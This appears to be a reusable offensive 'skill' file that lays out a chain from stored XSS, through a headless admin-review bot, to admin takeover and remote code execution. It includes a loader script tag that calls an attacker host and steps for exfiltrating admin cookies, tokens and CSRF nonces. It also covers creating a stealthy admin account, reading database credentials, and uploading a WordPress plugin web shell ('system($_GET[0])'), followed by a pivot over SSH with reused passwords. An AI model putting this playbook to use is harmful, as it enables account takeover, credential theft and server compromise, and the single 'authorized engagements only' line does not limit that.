---
name: stored-xss-admin-bot
description: Use when admin bot renders user input. Stored XSS to RCE.
---

# Stored XSS to Admin-Bot to Account Takeover to RCE (reusable)

Pattern - target runs an automated admin/reviewer (headless browser bot)
that renders user-submitted content. Stored XSS in that content runs with
the ADMIN session. Authorized engagements only.

## Finding the sink
- Any field whose value is rendered as HTML by a reviewing human or bot -
  summaries, descriptions, previews, comment bodies, transcript fields.
- Verify rendering context - innerHTML, template-escaped, attribute
  context, or inside a script tag. Payload shape differs per context.
- Escaped wrappers can still fall - markdown renderers, older jQuery .html(),
  rich-text fields bypassing sanitizers.

## Payload engineering constraints (hard-won)
- ATTRIBUTE context with quotes stripped - avoid double-quotes entirely -
  build them at runtime - `String.fromCharCode(34)`, backticks, regex `/`.
- Long payloads - reference a compact loader `<script src=//ATTACKER/x.js>`
  instead of inlining. Host the real logic on your listener.
- Synchronous XHR is more reliable than fetch().then() chains inside bot
  sandboxes - async callbacks die when the page navigates/closes.
- Entities - fetched pages may be HTML-entity encoded (`&amp;`) - regexes
  for CSRF nonces/tokens must match the ENCODED form.

## Bot queue discipline (critical)
- Bots usually process submissions OLDEST-FIRST at a fixed cadence (~1/min).
- Every junk payload you submit occupies a queue slot for real traffic.
  **One clean payload per fresh spawn/session.** Test payloads = hours of
  waiting behind your own garbage.
- Track bot behavior - per-submission visits or a review list? On spawn,
  on interval, or on trigger?

## What to do with the admin session (from your XSS callback)
1. Exfiltrate cookies/tokens + CSRF nonce of the admin session first.
2. Privilege escalation via admin functions, in order of stealth -
   - Create a new admin user (form POST, bypasses REST nonce quirks)
   - Read config files (DB creds) via any file/template editor
   - Upload capability - CMS/theme/plugin/package upload = direct RCE
     (WordPress - `/wp-admin/update.php?action=upload-plugin` with a
      plugin containing `<?php system($_GET[0]); ?>`)
3. Chain to foothold - DB creds from config -> internal services -> SSH
   with reused passwords.

## Listener setup (attacker side)
```bash
# python3 -m http.server 9001 --bind 0.0.0.0   (serves loader JS)
# or a socketserver logging any request line to a file -
#   every callback (cookie exfil, beacon) lands as a request log entry
```
